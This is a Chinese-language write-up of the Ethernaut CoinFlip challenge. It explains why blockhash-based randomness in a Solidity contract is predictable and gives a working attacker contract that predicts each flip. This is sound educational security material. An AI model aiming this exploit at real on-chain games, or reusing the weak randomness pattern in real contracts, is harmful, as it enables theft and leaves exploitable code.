# Ethernaut CTF Writeup

## Level 3 CoinFlip

> 題目: https://ethernaut.openzeppelin.com/level/0xae8ed765dbd45Ce48ebBd2496CeD6B1Ee29466fc

原始碼:
```
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract CoinFlip {
    uint256 public consecutiveWins;
    uint256 lastHash;
    uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;

    constructor() {
        consecutiveWins = 0;
    }

    function flip(bool _guess) public returns (bool) {
        uint256 blockValue = uint256(blockhash(block.number - 1));

        if (lastHash == blockValue) {
            revert();
        }

        lastHash = blockValue;
        uint256 coinFlip = blockValue / FACTOR;
        bool side = coinFlip == 1 ? true : false;

        if (side == _guess) {
            consecutiveWins++;
            return true;
        } else {
            consecutiveWins = 0;
            return false;
        }
    }
}
```

過關條件: 

- 這是一個擲銅板的遊戲，你需要連續地猜對十次

解法：

- 此題如同大部分偽隨機數的問題，產生隨機數的種子可預測，隨機數便可預測，此題運用區塊雜湊除以一個固定的 FACTOR，兩者皆為已知情況下，所產生的隨機數便不安全，產生的硬幣正反面結果便可預測，破壞此遊戲理想勝應有的 50% 勝率
- 由於手算每次正反面結果有點辛苦，編寫攻擊合約來達成是較可行的做法

```
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "./CoinFlip.sol";  // Import the CoinFlip contract

contract CoinFlipPredictor {
    CoinFlip public coinFlip;
    uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;
    
    constructor(address _coinFlipAddress) {
        coinFlip = CoinFlip(_coinFlipAddress);  // Set the CoinFlip contract address
    }

    function predictFlip() public returns (bool) {
        // Get the previous block hash (block.number - 1)
        uint256 blockValue = uint256(blockhash(block.number - 1));
        uint256 coinFlipResult = blockValue / FACTOR;
        bool side = coinFlipResult == 1 ? true : false;

        // Call the CoinFlip contract with the predicted side
        bool result = coinFlip.flip(side);
        return result;
    }
}
```